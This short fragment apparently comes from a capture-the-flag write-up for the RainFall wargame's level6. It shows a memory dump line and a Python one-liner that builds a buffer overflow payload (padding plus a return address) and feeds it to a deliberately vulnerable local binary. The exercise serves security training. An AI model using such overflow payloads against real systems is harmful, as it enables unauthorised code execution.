```
0xbffff6c0:	0xb7fed280	0x00000000	0x0804a050 	0x0804a008
```

```
level6@RainFall:~$ python -c 'print "A" * 0x48 + "\x54\x84\x04\x08" ' > /tmp/payload6
level6@RainFall:~$ ./level6 "$(</tmp/payload6)"
```
